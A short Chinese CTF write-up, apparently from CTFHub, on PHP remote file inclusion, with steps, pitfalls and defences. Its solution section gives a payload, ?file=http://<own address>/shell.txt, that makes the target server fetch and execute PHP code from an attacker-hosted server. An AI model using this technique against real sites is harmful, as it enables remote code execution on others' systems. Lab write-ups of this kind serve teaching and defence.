---
title: 文件包含-远程文件包含
date: 2026-11-18
tags: [CTFHub, WEB, 文件包含]
excerpt: allow_url_include 开着时，include 一个远程地址就能执行远程代码。
---

思路：如果 allow_url_include 开启，参数可以直接填一个 http:// 地址，PHP 会把远端文件拉下来当代码执行。这是危害最大的一种文件包含。

问题：
1. 不确定 allow_url_include 是否开启。
2. 不知道该把恶意文件放哪里。
3. 传了地址没反应，不知道是配置问题还是地址写错。

解决：
1. 先测：?file=http://自己的地址/shell.txt，如果服务器能拉到并执行，说明远程包含可用。
2. 起一个本地 HTTP 服务，放一个 shell.txt（内容是 PHP 代码，后缀随便，避免被当脚本）。
3. 访问带远程地址的链接，PHP 通过 HTTP 拉取并解析执行。
4. 执行命令拿到内容，提交通过。

补充：
1. 远程包含依赖 allow_url_include=On（默认是 Off），所以比本地包含少得多。
2. 除了 http，还能用 ftp、data:、php://input 等协议，只要 allow_url_fopen/Include 允许。
3. 防御：include 路径白名单，关闭 allow_url_include 和 allow_url_fopen。

工具：Burp Suite、python -m http.server

踩坑记录：
1. 忘了看 allow_url_include，测了半天发现是关的。
2. 本地 HTTP 服务只监听 127.0.0.1，服务器访问不到，得监听 0.0.0.0。
3. 文件后缀用了 .php，服务器拉取时被当作源码下载，改 .txt 才正常。

总结：远程文件包含把"文件包含"升级成了"远程代码执行"，危害比本地包含高一个量级。理解它需要先知道 PHP 的 URL 包装器机制。
